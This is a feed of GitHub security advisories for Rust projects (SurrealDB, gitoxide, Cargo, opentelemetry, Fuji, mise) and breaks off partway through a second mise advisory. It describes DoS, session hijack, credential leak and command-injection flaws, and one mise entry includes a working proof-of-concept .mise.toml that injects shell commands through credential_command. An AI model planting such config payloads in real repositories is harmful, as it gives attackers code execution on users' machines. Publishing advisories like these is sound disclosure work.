        <id>https://github.com/advisories/GHSA-q729-696q-g9pq</id>
        <link href="https://github.com/advisories/GHSA-q729-696q-g9pq"/>
        <updated>2026-07-01T20:03:34.000Z</updated>
        <content type="html"><![CDATA[<p>The SurrealDB value and JSON parser did not enforce the configured recursion depth limit when parsing nested <code>{</code>, <code>[</code>, or <code>(</code> tokens. The expression parser already enforced the limit for these tokens; the value/JSON parser omitted it. An unauthenticated attacker could send a deeply nested JSON payload to the WebSocket <code>/rpc</code> endpoint and exhaust server memory, crashing the process.</p>
<p>This is an incomplete fix for <a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-6r8p-hpg7-825g">GHSA-6r8p-hpg7-825g</a>, which addressed the same class of bug in the expression parser but did not cover the value/JSON parser code path.</p>
<h3 id="impact">Impact</h3>
<p>An unauthenticated remote attacker can crash a SurrealDB server with a single WebSocket message. No credentials or query execution privileges are required.</p>
<h3 id="patches">Patches</h3>
<p>A patch enforces the configured recursion depth limit in <code>parse_value</code> and <code>parse_json</code>, bringing them in line with the rest of the parser.</p>
<ul>
<li>Versions 3.1.0 and later are not affected by this issue.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Restrict network access to the WebSocket <code>/rpc</code> endpoint to trusted clients.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-q729-696q-g9pq">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-q729-696q-g9pq</a></li>
<li><a href="https://github.com/surrealdb/surrealdb/commit/1bd9826f477f4089134460dc5574b6f4e6916973">https://github.com/surrealdb/surrealdb/commit/1bd9826f477f4089134460dc5574b6f4e6916973</a></li>
<li><a href="https://github.com/advisories/GHSA-q729-696q-g9pq">https://github.com/advisories/GHSA-q729-696q-g9pq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q729-696q-g9pq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-01T20:03:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[surrealdb] SurrealDB: HTTP RPC Session Race Condition Allows Privilege Escalation]]></title>
        <id>https://github.com/advisories/GHSA-4vgr-h27g-cf9p</id>
        <link href="https://github.com/advisories/GHSA-4vgr-h27g-cf9p"/>
        <updated>2026-07-01T20:02:08.000Z</updated>
        <content type="html"><![CDATA[<p>The HTTP <code>/rpc</code> endpoint has a time-of-check/time-of-use (TOCTOU) race condition on internal session state. When authenticated and unauthenticated requests are processed concurrently, the unauthenticated request can inherit the authenticated user's session and privileges. The <code>/rpc</code> endpoint is the primary interface used by all official SurrealDB SDKs.</p>
<p>The HTTP <code>/rpc</code> handler does not bind each incoming request to an isolated session context. Instead, concurrent requests share mutable authentication state. When an authenticated request sets the session context and an unauthenticated request races in before it is cleared, the unauthenticated request executes with the authenticated user's privileges.</p>
<p>The impact depends on the privilege level of the session that is hijacked. If a root or namespace-level user session is inherited, the attacker can read and modify any data, delete records, and create persistent namespace-level users. If a scoped record user session is inherited, the attacker is limited to that user's permissions.</p>
<p>The attack requires no credentials, tokens, or session knowledge — only the ability to send concurrent HTTP requests to the <code>/rpc</code> endpoint while legitimate authenticated traffic is active.</p>
<h2 id="impact">Impact</h2>
<p>An unauthenticated attacker who can reach the <code>/rpc</code> endpoint can escalate privileges by racing against any active authenticated session. The severity of the impact depends on the permissions of the user whose session was hijacked. This could include escalation to root user of SurrealDB instance</p>
<h2 id="patches">Patches</h2>
<p>Versions prior to SurrealDB <code>v3.1.0</code> are vulnerable.</p>
<p>A patch has been introduced that replaces the shared default session with per-request session isolation. Every <code>POST /rpc</code> request now allocates a fresh, server-side UUID and runs entirely within that session's scope for the duration of the request. The session-map signatures across the RPC protocol have been changed from <code>Option&lt;Uuid&gt;</code> to <code>Uuid</code> so the "default session" can no longer be represented at the type level, preventing future regressions of the same shape.</p>
<h2 id="workarounds">Workarounds</h2>
<p>There is no configuration-level mitigation that fully addresses this vulnerability. Network-level controls restricting access to the <code>/rpc</code> endpoint to trusted clients can reduce exposure.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-4vgr-h27g-cf9p">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-4vgr-h27g-cf9p</a></li>
<li><a href="https://github.com/surrealdb/surrealdb/commit/2f53e6e86d1b87e38300e714cfd7aede1abe4c3d">https://github.com/surrealdb/surrealdb/commit/2f53e6e86d1b87e38300e714cfd7aede1abe4c3d</a></li>
<li><a href="https://github.com/surrealdb/surrealdb/commit/fd800fc7c55afcdc97057d18cf7cb7f83557e702">https://github.com/surrealdb/surrealdb/commit/fd800fc7c55afcdc97057d18cf7cb7f83557e702</a></li>
<li><a href="https://github.com/advisories/GHSA-4vgr-h27g-cf9p">https://github.com/advisories/GHSA-4vgr-h27g-cf9p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4vgr-h27g-cf9p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-01T20:02:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[surrealdb] SurrealDB: HTTP /rpc `sessions` method leaks attached session UUIDs, enabling full session hijack by anonymous callers]]></title>
        <id>https://github.com/advisories/GHSA-5qfp-32cf-69jh</id>
        <link href="https://github.com/advisories/GHSA-5qfp-32cf-69jh"/>
        <updated>2026-07-01T20:00:18.000Z</updated>
        <content type="html"><![CDATA[<p>The HTTP <code>/rpc</code> <code>sessions</code> method returned every attached session UUID without authentication, and the <code>/rpc</code> handler accepted an arbitrary <code>session</code> field with no ownership check. An anonymous caller could enumerate UUIDs and impersonate any authenticated session.</p>
<p>"Attached" means sessions registered via <code>{"method":"attach"}</code> — the only writer to the HTTP session map. Ordinary stateless <code>/rpc</code> requests use ephemeral per-request sessions that are filtered from <code>sessions()</code> and destroyed at end-of-request, so they are not enumerable.</p>
<h3 id="exposure">Exposure</h3>
<ul>
<li><strong>Exposed:</strong> clients that issue <code>attach</code>, notably the official Rust SDK's <code>Http</code>/<code>Https</code> engine (auto-attaches once per <code>Surreal</code> handle).</li>
<li><strong>Not exposed:</strong> REST endpoints (<code>/sql</code>, <code>/key</code>, <code>/signin</code>, <code>/export</code>, etc.); WebSocket <code>/rpc</code> (per-connection scope, <code>attach</code> refused); embedded / MCP usage; ad-hoc <code>POST /rpc</code> callers that never <code>attach</code>.</li>
</ul>
<h3 id="impact">Impact</h3>
<p>For each <strong>attached and authenticated</strong> session, an unauthenticated attacker can read, write, and delete any data the session can reach, dump metadata, invalidate sessions, and escalate to that session's privilege level (up to root). An attached session that has not yet authenticated is <code>Level::No</code> and confers no privilege.</p>
<h3 id="patches">Patches</h3>
<ol>
<li>HTTP <code>sessions()</code> now returns <code>method_not_allowed</code>. WebSocket retains per-connection enumeration.</li>
<li>The HTTP <code>/rpc</code> handler gates client-supplied session IDs against the caller's request-level auth principal (actor id + level); mismatches return <code>session_not_found</code>.</li>
<li>Attached HTTP sessions are capped via <code>SURREAL_HTTP_MAX_ATTACHED_SESSIONS</code>.</li>
</ol>
<p>Versions 3.1.0 and later are not affected.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No configuration-level mitigation fully addresses this. For Users unable to upgrade:</p>
<ul>
<li>Avoid SDKs and client flows that call <code>attach</code> against HTTP <code>/rpc</code> (notably the Rust SDK's <code>Http</code>/<code>Https</code> engine). Prefer the WebSocket transport, or REST endpoints (<code>/sql</code>, <code>/signin</code>, <code>/key</code>, <code>/export</code>) which never populate the attached-session map.</li>
<li>Restrict <code>/rpc</code> to trusted clients at the network layer.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-5qfp-32cf-69jh">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-5qfp-32cf-69jh</a></li>
<li><a href="https://github.com/surrealdb/surrealdb/commit/fd800fc7c55afcdc97057d18cf7cb7f83557e702">https://github.com/surrealdb/surrealdb/commit/fd800fc7c55afcdc97057d18cf7cb7f83557e702</a></li>
<li><a href="https://github.com/advisories/GHSA-5qfp-32cf-69jh">https://github.com/advisories/GHSA-5qfp-32cf-69jh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5qfp-32cf-69jh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-01T20:00:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gix] Duplicate Advisory: gitoxide: CommandForbiddenInModulesConfiguration Bypass in gix_submodule::File::update() Enables Arbitrary Command Execution via .gitmodules]]></title>
        <id>https://github.com/advisories/GHSA-m4f9-c775-wg56</id>
        <link href="https://github.com/advisories/GHSA-m4f9-c775-wg56"/>
        <updated>2026-06-30T17:40:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-f26g-jm89-4g65. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>gix-submodule before 0.82.0 incorrectly validates the update field in .gitmodules, allowing attackers to bypass the CommandForbiddenInModulesConfiguration guard when a submodule has been initialized with only partial configuration in .git/config. An attacker can inject arbitrary shell commands via the update field in .gitmodules that will be executed when Submodule::update() is called on a previously-initialized submodule, enabling remote code execution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-f26g-jm89-4g65">https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-f26g-jm89-4g65</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40034">https://nvd.nist.gov/vuln/detail/CVE-2026-40034</a></li>
<li><a href="https://github.com/GitoxideLabs/gitoxide/commit/6a2e6a436f76c8bbf2487f9967413a51356667a0">https://github.com/GitoxideLabs/gitoxide/commit/6a2e6a436f76c8bbf2487f9967413a51356667a0</a></li>
<li><a href="https://github.com/GitoxideLabs/gitoxide/commit/dd5c18d9e526e8de462fa40aa047acd097cfa7dc">https://github.com/GitoxideLabs/gitoxide/commit/dd5c18d9e526e8de462fa40aa047acd097cfa7dc</a></li>
<li><a href="https://red.anthropic.com/2026/cvd/findings/ANT-2026-6SNS6KMP">https://red.anthropic.com/2026/cvd/findings/ANT-2026-6SNS6KMP</a></li>
<li><a href="https://www.vulncheck.com/advisories/gitoxide-command-injection-via-partial-gitmodules-override-in-gix-submodule">https://www.vulncheck.com/advisories/gitoxide-command-injection-via-partial-gitmodules-override-in-gix-submodule</a></li>
<li><a href="https://github.com/advisories/GHSA-m4f9-c775-wg56">https://github.com/advisories/GHSA-m4f9-c775-wg56</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m4f9-c775-wg56</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-26T15:32:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cargo] Cargo crates in third party registries can override the cached source of other crates]]></title>
        <id>https://github.com/advisories/GHSA-jq42-7mfv-hm57</id>
        <link href="https://github.com/advisories/GHSA-jq42-7mfv-hm57"/>
        <updated>2026-06-26T21:48:46.000Z</updated>
        <content type="html"><![CDATA[<p>The Rust Security Response Team was notified that Cargo incorrectly handled symlinks inside of crate tarballs downloaded from third-party registries, allowing a malicious crate to override the source code of another crate from the same registry.</p>
<p>This vulnerability is tracked as CVE-2026-5223. The severity of the vulnerability is <strong>medium</strong> for users of third-party registries. Users of crates.io are <strong>not affected</strong>, as crates.io forbids uploading crates containing any symlink.</p>
<h2 id="overview">Overview</h2>
<p>When building a crate, Cargo extracts its source code in a local cache (stored within <code>~/.cargo</code>), reusing it for any future build. Cargo includes protections to prevent any file from being extracted outside of the crate's own cache directory.</p>
<p>It was discovered that it's possible to craft a malicious tarball able to extract files one level below the crate's own cache directory. With the way the cache is structured, that allowed the malicious crate to override the cache of other crates belonging to the same registry.</p>
<h2 id="mitigations">Mitigations</h2>
<p>Rust 1.96.0, to be released on May 28th, 2026, will update Cargo to reject extracting <em>any</em> symlink within crate tarballs, regardless of whether they come from crates.io (which already forbids them) or third-party registries. Note that Cargo never added symlinks when running <code>cargo package</code> or <code>cargo publish</code>, so the impact of this should be minimal.</p>
<p>Users who are not able to upgrade to the most recent Rust version are recommended to audit the contents of their registry for the presence of any symlink, and to configure their registry to reject symlink (if such option is available).</p>
<h2 id="affected-versions">Affected versions</h2>
<p>All versions of Cargo shipped before Rust 1.96.0 are affected.</p>
<h2 id="acknowledgements">Acknowledgements</h2>
<p>Cargo would like to thank Christos Papakonstantinou for reporting this to us according to the <a href="https://rust-lang.org/policies/security">Rust security policy</a>.</p>
<p>Cargo also wants to thank the members of the Rust project who helped address the vulnerability: Josh Triplett for developing the fix; Arlo Siemsen for reviewing the fix; Emily Albini for writing this advisory; Emily Albini, Josh Stone and Manish Goregaokar for coordinating the disclosure; Ed Page and Eric Huss for advising during the disclosure.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rust-lang/cargo/security/advisories/GHSA-jq42-7mfv-hm57">https://github.com/rust-lang/cargo/security/advisories/GHSA-jq42-7mfv-hm57</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-5223">https://nvd.nist.gov/vuln/detail/CVE-2026-5223</a></li>
<li><a href="https://github.com/rust-lang/cargo/pull/17031">https://github.com/rust-lang/cargo/pull/17031</a></li>
<li><a href="https://blog.rust-lang.org/2026/05/25/cve-2026-5223">https://blog.rust-lang.org/2026/05/25/cve-2026-5223</a></li>
<li><a href="https://groups.google.com/g/rustlang-security-announcements/c/IB74S7Yksg8">https://groups.google.com/g/rustlang-security-announcements/c/IB74S7Yksg8</a></li>
<li><a href="https://github.com/advisories/GHSA-jq42-7mfv-hm57">https://github.com/advisories/GHSA-jq42-7mfv-hm57</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jq42-7mfv-hm57</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-26T21:48:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cargo] Cargo can be coerced to share credentials between registries]]></title>
        <id>https://github.com/advisories/GHSA-p688-r7jv-fm6f</id>
        <link href="https://github.com/advisories/GHSA-p688-r7jv-fm6f"/>
        <updated>2026-06-26T21:47:56.000Z</updated>
        <content type="html"><![CDATA[<p>The Rust Security Response Team was notified that Cargo incorrectly normalized the URLs of third-party registries using the <a href="https://doc.rust-lang.org/cargo/reference/registries.html#registry-protocols">sparse index protocol</a>. If a hosting provider allowed multiple registries to be hosted with arbitrary names within the same domain, an attacker able to publish crates in a registry could obtain the credentials of others users of the same registry.</p>
<p>This vulnerability is tracked as CVE-2026-5222. The severity of the vulnerability is <strong>low</strong>, due to the extremely niche requirements needed to achieve the attack.</p>
<h2 id="overview">Overview</h2>
<p>Originally Cargo only supported storing a registry's index within git repositories. Most git hosting solutions allow accessing a git repository with or without the <code>.git</code> suffix, so Cargo mirrored this behavior when normalizing registry URLs. This allowed credentials for <code>https://example.com/index</code> to be used for <code>https://example.com/index.git</code>.</p>
<p>This normalization was unintentionally applied to the new sparse indexes too. Sparse indexes can be hosted on any HTTPS server, which treat URLs ending with <code>.git</code> as different URLs than those without the suffix.</p>
<p>If the following conditions apply:</p>
<ul>
<li><code>https://example.com/index</code> is a sparse index.</li>
<li><code>https://example.com/index</code> allows crates to depend on crates from any other registry.</li>
<li>The attacker is able to publish crates on <code>https://example.com/index</code>.</li>
<li>The attacker is able to upload arbitrary files to <code>https://example.com/index.git</code>.</li>
</ul>
<p>...the attacker could configure <code>https://example.com/index.git</code> to be a Cargo sparse registry requiring authentication for downloads, and with a download URL pointing to a server recording any credentials set to it.</p>
<p>When the attacker then publishes a crate <code>foo</code> to <code>https://example.com/index</code> depending on a crate <code>bar</code> from <code>https://example.com/index.git</code>, and tricks the victim into downloading <code>foo</code>,  Cargo will think the two registries share the same credential and send the victim's Cargo token to the malicious registry.</p>
<h2 id="mitigations">Mitigations</h2>
<p>Rust 1.96, to be released on May 28th, 2026, will update Cargo to only strip the <code>.git</code> suffix from registry URLs using the git protocol. No mitigations are available for users of older versions of Cargo.</p>
<h2 id="affected-versions">Affected versions</h2>
<p>All versions of Cargo shipped between Rust 1.68 (the stabilization of sparse registries) and 1.96 are affected.</p>
<h2 id="acknowledgements">Acknowledgements</h2>
<p>Cargo would like to thank Christos Papakonstantinou for reporting this issue according to the <a href="https://rust-lang.org/policies/security">Rust security policy</a>.</p>
<p>Cargo also wants to thank the members of the Rust project who helped address the vulnerability: Arlo Siemens for developing the fix; Weihang Lo, Eric Huss and Emily Albini for reviewing the fix; Emily Albini for writing this advisory; Emily Albini, Josh Stone and Manish Goregaokar for coordinating the disclosure.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rust-lang/cargo/security/advisories/GHSA-p688-r7jv-fm6f">https://github.com/rust-lang/cargo/security/advisories/GHSA-p688-r7jv-fm6f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-5222">https://nvd.nist.gov/vuln/detail/CVE-2026-5222</a></li>
<li><a href="https://github.com/rust-lang/cargo/pull/17031">https://github.com/rust-lang/cargo/pull/17031</a></li>
<li><a href="https://blog.rust-lang.org/2026/05/25/cve-2026-5222">https://blog.rust-lang.org/2026/05/25/cve-2026-5222</a></li>
<li><a href="https://groups.google.com/g/rustlang-security-announcements/c/SfUxOiIdY5s">https://groups.google.com/g/rustlang-security-announcements/c/SfUxOiIdY5s</a></li>
<li><a href="https://github.com/advisories/GHSA-p688-r7jv-fm6f">https://github.com/advisories/GHSA-p688-r7jv-fm6f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p688-r7jv-fm6f</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-26T21:47:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[opentelemetry_sdk] opentelemetry_sdk has unbounded memory allocation in W3C Baggage propagation]]></title>
        <id>https://github.com/advisories/GHSA-w9wp-h8wv-79jx</id>
        <link href="https://github.com/advisories/GHSA-w9wp-h8wv-79jx"/>
        <updated>2026-06-25T18:40:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>BaggagePropagator::extract_with_context</code> in <code>opentelemetry_sdk</code> did not enforce the W3C Baggage size limits before parsing an inbound <code>baggage</code> header. A large attacker-controlled header could cause unnecessary CPU work and short-lived heap allocations while parsing entries that would later be discarded by the SDK's baggage storage limits.</p>
<p>The SDK now applies limits aligned with the W3C Baggage limits:</p>
<ul>
<li>64 list-members</li>
<li>8192 bytes total</li>
</ul>
<h2 id="impact">Impact</h2>
<p>Services that accept untrusted inbound propagation headers may experience increased per-request resource usage when processing oversized <code>baggage</code> headers. This can contribute to denial-of-service risk, especially when application or transport-level header limits are absent or configured above the W3C Baggage limits.</p>
<p>The impact is limited to availability. This issue does not expose telemetry data, modify telemetry data, or allow code execution.</p>
<h2 id="patches">Patches</h2>
<p>Upgrade <code>opentelemetry_sdk</code> to version <code>0.32.1</code> or later.</p>
<p>Version <code>0.32.1</code> rejects <code>baggage</code> header values larger than 8192 bytes and limits extraction to the first 64 list-members.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading immediately is not possible, reject or limit inbound <code>baggage</code> headers larger than 8192 bytes before invoking OpenTelemetry propagation extraction. This can be enforced at a proxy, gateway, middleware layer, or custom carrier boundary.</p>
<h2 id="resources">Resources</h2>
<ul>
<li>W3C Baggage limits: <a href="https://www.w3.org/TR/baggage/#limits">https://www.w3.org/TR/baggage/#limits</a></li>
<li>Related OpenTelemetry Java advisory: <a href="https://github.com/open-telemetry/opentelemetry-java/security/advisories/GHSA-rcgg-9c38-7xpx">https://github.com/open-telemetry/opentelemetry-java/security/advisories/GHSA-rcgg-9c38-7xpx</a></li>
<li>Related OpenTelemetry Go advisory: <a href="https://github.com/open-telemetry/opentelemetry-go/security/advisories/GHSA-mh2q-q3fh-2475">https://github.com/open-telemetry/opentelemetry-go/security/advisories/GHSA-mh2q-q3fh-2475</a></li>
<li>CVE-2026-48504</li>
</ul>
<h2 id="credit">Credit</h2>
<p>tonghuaroot</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-telemetry/opentelemetry-rust/security/advisories/GHSA-w9wp-h8wv-79jx">https://github.com/open-telemetry/opentelemetry-rust/security/advisories/GHSA-w9wp-h8wv-79jx</a></li>
<li><a href="https://github.com/advisories/GHSA-w9wp-h8wv-79jx">https://github.com/advisories/GHSA-w9wp-h8wv-79jx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w9wp-h8wv-79jx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-25T18:40:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fixurjavainstall] fixurjavainstall: Previous Fuji versions can accidentally wipe `/usr/share/man/man8`]]></title>
        <id>https://github.com/advisories/GHSA-fq3w-p4fg-mw73</id>
        <link href="https://github.com/advisories/GHSA-fq3w-p4fg-mw73"/>
        <updated>2026-06-25T18:00:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Affects: Anyone who generates the UNIX man pages in Fuji &lt;= <code>0.8.0</code> build with the <code>dev</code> crate feature.
Consequences: <code>/usr/share/man/man8</code> may be entirely removed &amp; re-created without any of the previous entries.</p>
<h3 id="patches">Patches</h3>
<p>At the time of writing, no new version has been released on crates.io, due to an unrelated CI/CD publishing issue.
Due to the same unrelated publishing issue, no new GitHub Releases version has been released.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not run <code>fuji manual</code> on non-<code>dev</code> builds for versions &lt;= <code>0.8.0</code>.</p>
<h3 id="additional-information">Additional Information</h3>
<p>This bug results from development-only code being accidentally left in for release use.
Previous versions of Fuji are still "safe" to use, provided that you do not run <code>fuji manual</code>.
There is no malicious potential from this, it's just a major annoyance to accidentally remove all your sysadmin man pages.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/EpicVon2468/fixurjavainstall/security/advisories/GHSA-fq3w-p4fg-mw73">https://github.com/EpicVon2468/fixurjavainstall/security/advisories/GHSA-fq3w-p4fg-mw73</a></li>
<li><a href="https://github.com/advisories/GHSA-fq3w-p4fg-mw73">https://github.com/advisories/GHSA-fq3w-p4fg-mw73</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fq3w-p4fg-mw73</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-25T18:00:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mise] Mise's local credential_command executes untrusted config]]></title>
        <id>https://github.com/advisories/GHSA-29hf-rm4x-xxph</id>
        <link href="https://github.com/advisories/GHSA-29hf-rm4x-xxph"/>
        <updated>2026-06-23T18:24:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>mise</code> loads <code>github.credential_command</code> from local project config before any trust decision, then executes that value with <code>sh -c</code> when resolving a GitHub token. An attacker who can place a <code>.mise.toml</code> in a repository can execute arbitrary shell commands when the victim runs a GitHub-related mise command and no higher-priority GitHub token environment variable is set.</p>
<p>The current command-execution path is <code>github.credential_command</code>. I confirmed in Docker that the setting is exploitable on <code>v2026.3.15</code> and <code>v2026.3.17</code>, while <code>v2026.3.14</code> rejects it as an unknown field. This report does not depend on the separate trust-bypass issue because the sink is reached directly from <code>[settings.github]</code>.</p>
<h3 id="details">Details</h3>
<p>The vulnerable load order is:</p>
<ol>
<li><a href="https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/config/settings.rs#L254-L283"><code>Settings::try_get()</code></a> preloads settings from local config files.</li>
<li><a href="https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/config/settings.rs#L505-L510"><code>parse_settings_file()</code></a> returns <code>settings_file.settings</code> without checking whether the local file is trusted.</li>
<li><a href="https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/github.rs#L344-L390"><code>resolve_token()</code></a> checks <code>settings.github.credential_command</code> after the token env vars and before file-based sources.</li>
<li><a href="https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/github.rs#L558-L599"><code>get_credential_command_token()</code></a> executes the value with <code>sh -c</code>.</li>
</ol>
<p>The main command-execution path is:</p>
<pre><code class="language-rust">let result = std::process::Command::new("sh")
    .arg("-c")
    .arg(cmd)
    .arg("mise-credential-helper")
    .arg(host)
    .output()
</code></pre>
<p>If a local project file sets:</p>
<pre><code class="language-toml">[settings.github]
credential_command = "echo credential_command_rce &gt; /tmp/mise-proof.txt; echo ghp_fake_token"
</code></pre>
<p>then <code>resolve_token()</code> will reach <code>get_credential_command_token()</code> whenever higher-priority GitHub token environment variables are unset. <code>credential_command</code> is a documented custom credential source for mise, but it is also accepted from a local project <code>.mise.toml</code>, which lets an untrusted repository supply a shell command for mise to execute.</p>
<h3 id="poc">PoC</h3>
<p>Test environment:</p>
<ul>
<li>Docker</li>
<li><code>linux-arm64</code></li>
<li><code>mise v2026.3.17</code></li>
</ul>
<p>Negative control:</p>
<pre><code class="language-bash">export GITHUB_TOKEN=env_token
mise github token --unmask
</code></pre>
<p>Observed:</p>
<pre><code class="language-text">github.com: env_token (source: GITHUB_TOKEN)
/tmp/mise-proof.txt =&gt; missing
</code></pre>
<p>Primary exploit:</p>
<pre><code class="language-toml">[settings.github]
credential_command = "echo credential_command_rce &gt; /tmp/mise-proof.txt; echo ghp_fake_token"
</code></pre>
<p>Run:</p>
<pre><code class="language-bash">unset GITHUB_TOKEN GITHUB_API_TOKEN MISE_GITHUB_TOKEN MISE_GITHUB_ENTERPRISE_TOKEN
mise github token --unmask
</code></pre>
<p>Observed:</p>
<pre><code class="language-text">github.com: ghp_fake_token (source: credential_command)
</code></pre>
<p>And the side effect file is created:</p>
<pre><code class="language-text">/tmp/mise-proof.txt =&gt; credential_command_rce
</code></pre>
<p>Related version check:</p>
<ul>
<li><code>v2026.3.14</code>: <code>credential_command</code> is rejected as an unknown field</li>
<li><code>v2026.3.15</code>: the same PoC executes and returns <code>source: credential_command</code></li>
</ul>
<h3 id="impact">Impact</h3>
<p>An attacker who can place a <code>.mise.toml</code> in a repository can execute arbitrary shell commands as the victim user when the victim runs a mise command that resolves a GitHub token from local settings.</p>
<p>Demonstrated impact:</p>
<ul>
<li>arbitrary command execution as the victim user</li>
<li>no trust prompt</li>
<li>no need for <code>[env]</code>, <code>[hooks]</code>, tasks, or templates</li>
</ul>
<p>Important limitation:</p>
<ul>
<li>if a higher-priority GitHub token environment variable is already set, the <code>credential_command</code> path is not reached</li>
</ul>
<h3 id="suggested-fix">Suggested Fix</h3>
<p>Do not honor <code>github.credential_command</code> from non-global project config files.</p>
<p>For example, inside <code>parse_settings_file()</code>:</p>
<pre><code class="language-rust">pub fn parse_settings_file(path: &amp;Path) -&gt; Result&lt;SettingsPartial&gt; {
    let raw = file::read_to_string(path)?;
    let settings_file: SettingsFile = toml::from_str(&amp;raw)?;
    let mut settings = settings_file.settings;

    if !config::is_global_config(path) {
        settings.github.credential_command = None;
    }

    Ok(settings)
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jdx/mise/security/advisories/GHSA-29hf-rm4x-xxph">https://github.com/jdx/mise/security/advisories/GHSA-29hf-rm4x-xxph</a></li>
<li><a href="https://github.com/advisories/GHSA-29hf-rm4x-xxph">https://github.com/advisories/GHSA-29hf-rm4x-xxph</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-29hf-rm4x-xxph</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-23T18:24:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mise] Mise vulnerable to arbitrary command execution via task-include files in an untrusted, config-less repository]]></title>
        <id>https://github.com/advisories/GHSA-77g9-363w-rccq</id>
        <link href="https://github.com/advisories/GHSA-77g9-363w-rccq"/>
        <updated>2026-06-23T18:24:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>mise's trust feature gates config files (<code>mise.toml</code>, <code>.tool-versions</code>) through <code>trust_check</code>, but task-include files are loaded on a path that never reaches it. When a directory has a task-include dir (<code>mise-tasks/</code>, <code>.mise/tasks/</code>, …) but no config file, mise falls back to the default includes and renders each task's tera fields — and that tera environment has <code>exec()</code> registered. A <code>{{ exec(command='…') }}</code> in any rendered field runs arbitrary commands the moment the tasks are merely listed. There's no config file to gate on, so no trust prompt ever appears. Read-only commands trigger it: <code>mise tasks</code>, <code>mise task ls</code>, <code>mise run</code>, <code>mise tasks --usage</code> (the query shell completion runs on Tab). The victim only has to <code>cd</code> into a cloned repo and list or tab-complete a task</p>
<h2 id="details">Details</h2>
<p>Trust is enforced only inside config-file parsing:</p>
<ul>
<li><code>src/config/config_file/mise_toml.rs:276</code> — <code>MiseToml::from_str</code> → <code>trust_check(path)?</code></li>
